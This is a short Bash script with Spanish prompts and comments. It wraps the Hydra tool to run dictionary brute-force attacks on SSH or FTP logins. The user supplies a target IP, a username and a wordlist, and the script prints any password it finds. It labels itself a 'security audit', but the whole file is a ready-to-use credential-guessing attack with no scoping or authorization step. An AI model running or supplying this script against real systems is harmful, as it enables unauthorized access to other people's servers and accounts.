#!/bin/bash

verde='\033[0;32m'
rojo='\033[0;31m'
sin_color='\033[0m'

# Configuración
read -p "Por favor, ingresa la IP objetivo: " target
read -p "Ingresa el usuario: " user          # Nombre de usuario
read -p "Ingresa el diccionario: " diccionario

# Comprobación de dependencias
if ! command -v hydra &> /dev/null; then
    echo "Hydra no está instalado. Instálalo con sudo apt-get install hydra" && exit
else
    echo "Hydra está instalado"
fi

# Comprobación de archivo de contraseñas
if [ ! -f "$diccionario" ]; then
    echo -e "${rojo}El diccionario de contraseñas '$diccionario' no existe, debes ponerlo dentro del directorio actual${sin_color}"
    exit
fi

ssh_attack() {
    # Inicio del ataque de fuerza bruta
    echo -e "${verde}Iniciando auditoría de seguridad por SSH en $target...${sin_color}"
    sleep 3

    output=$(hydra -l "$user" -P "$diccionario" ssh://"$target" -t 4 -vV 2>/dev/null)

    # Comprobación del resultado
    if echo "$output" | grep -qi "login:\|password:"; then
        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${verde}Contraseña encontrada, es:${sin_color} $password"
        exit 0
    else
        echo -e "${rojo}No se encontró ninguna contraseña válida en el archivo${sin_color}"
        exit 0
    fi
}

ftp_attack() {
    # Inicio del ataque de fuerza bruta
    echo -e "${verde}Iniciando auditoría de seguridad por FTP en $target...${sin_color}"
    sleep 3

    output=$(hydra -l "$user" -P "$diccionario" ftp://"$target" -t 4 -vV 2>&1)

    # Comprobación del resultado
    if echo "$output" | grep -qi "login:\|password:"; then
        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${verde}Contraseña encontrada, es:${sin_color} $password"
        exit 0
    else
        echo -e "${rojo}No se encontró ninguna contraseña válida en el archivo${sin_color}"
        exit 0
    fi
}

read -p "Elige si quieres hacer el ataque por SSH o por FTP (Escribe SSH o FTP): " eleccion

if [ "$eleccion" == "SSH" ]; then
    ssh_attack
elif [ "$eleccion" == "FTP" ]; then
    ftp_attack
else
    echo -e "${rojo}Debes escribir FTP o SSH ${sin_color}"
    exit 0
fi
